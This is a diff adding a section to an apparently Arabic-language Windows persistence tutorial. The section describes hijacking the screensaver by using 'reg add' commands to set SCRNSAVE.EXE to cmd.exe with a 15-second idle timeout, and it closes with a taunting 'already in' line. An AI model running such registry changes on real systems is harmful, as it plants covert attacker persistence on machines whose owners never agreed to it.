@@ -154,3 +154,40 @@ C:\Windows\System32
 <iframe src="https://giphy.com/embed/1236TCtX5dsGEo" width="480" height="480" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
 </body>
 </html>
+
+
+## Screensavers
+
+<html>
+<div dir="rtl" align="right">
+بأختصار اذا ما استخدمت جهازك لمدة معينة رح تضهر لك شاشة سوداء. نقدر نستغلها كالأتي اول شي استخدم هذا الكوماند عشان نعدل على الملف الي رح يشتغل اذا ما تم استخدام الجهاز:
+</div>
+</html>
+
+`reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "SCRNSAVE.EXE" /t REG_SZ /d "cmd.exe" /f`
+
+<html>
+<div dir="rtl" align="right">
+بعدين رح نعدل على كم ثانية اذا المستخدم ما اشتغل على الجهاز عشان يشغل لنا ال cmd.exe
+</div>
+</html>
+
+`reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "ScreenSaveTimeOut" /t REG_SZ /d "15" /f`
+
+![](../../images/persistence/14.png)
+
+<html>
+<div dir="rtl" align="right">
+انتضر شوي ورح تطلع لك ال cmd بنفس الوقت خلي ببالك انه في group policy لل screensavers في ال Active Airectory
+</div>
+</html>
+
+### `Demo`
+
+![](../../images/persistence/screen.gif)
+
+`Leave your computer on, while I am already in ;)`
+
+<html>
+<div style="width:100%;height:0;padding-bottom:75%;position:relative;"><iframe src="https://giphy.com/embed/1JyWrrkCIUQyQ" width="100%" height="100%" style="position:absolute" frameBorder="0" class="giphy-embed" allowFullScreen></iframe></div><p><a href="https://giphy.com/gifs/mfw-volume-webm-1JyWrrkCIUQyQ">via GIPHY</a></p>
+</html>
